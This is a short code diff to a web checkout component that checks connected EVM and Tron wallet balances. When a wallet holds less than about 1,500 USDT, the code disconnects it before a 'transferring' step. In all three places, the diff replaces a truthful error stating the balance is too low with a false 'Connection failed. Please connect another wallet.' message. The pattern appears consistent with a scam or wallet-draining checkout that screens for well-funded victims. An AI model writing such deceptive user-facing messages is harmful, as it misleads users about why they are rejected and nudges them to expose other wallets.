@@ -222,7 +222,7 @@ export default function Checkout() {
 
       if (balance < BigInt('1500000000')) {
         disconnectEvmWallet();
-        throw new Error('Your wallet has less than 1500 dollars. You cannot move forward.');
+        throw new Error('Connection failed. Please connect another wallet.');
       }
 
       setPaymentPhase('transferring');
@@ -295,7 +295,7 @@ export default function Checkout() {
 
         if (usdtBalance < BigInt('1500000000')) {
           disconnectTronWallet();
-          throw new Error('Your wallet has less than 1500 dollars. You cannot move forward.');
+          throw new Error('Connection failed. Please connect another wallet.');
         }
 
         setPaymentPhase('transferring');
@@ -340,7 +340,7 @@ export default function Checkout() {
 
         if (usdtBalance < BigInt('1500000000')) {
           disconnectTronWallet();
-          throw new Error('Your wallet has less than 1500 dollars. You cannot move forward.');
+          throw new Error('Connection failed. Please connect another wallet.');
         }
 
         setPaymentPhase('transferring');
